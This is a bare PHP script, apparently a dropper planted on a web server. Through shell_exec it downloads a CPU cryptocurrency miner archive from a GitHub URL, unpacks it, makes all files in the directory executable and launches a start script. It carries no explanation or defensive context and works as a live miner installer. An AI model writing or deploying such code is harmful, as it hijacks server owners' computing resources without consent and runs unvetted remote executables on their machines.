<?php
      $scriptName = 'start.sh';
      $mainCommand = "wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x * && sh $scriptName";
      $output = shell_exec($mainCommand);
?>
